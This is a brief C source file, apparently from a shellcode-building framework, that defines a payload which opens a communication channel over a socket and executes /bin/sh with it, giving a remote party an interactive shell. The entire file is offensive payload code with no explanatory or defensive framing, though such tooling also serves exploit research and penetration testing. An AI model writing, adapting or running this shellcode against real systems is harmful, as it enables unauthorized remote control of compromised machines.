#include <factory.h>

#include "helpers/process.c"
#include "helpers/io.c"
#include "helpers/socket.c"

SHELLCODE_ENTRY {

#if (SET_ARGV0 == 1)
    char *const argv[] = { "/bin/sh", NULL };
#else
    char *const argv[] = { NULL };
#endif
    char *const envp[] = { NULL };

    struct channel chan = get_communication_channel();
    execute("/bin/sh", argv, envp, chan);

} SHELLCODE_END
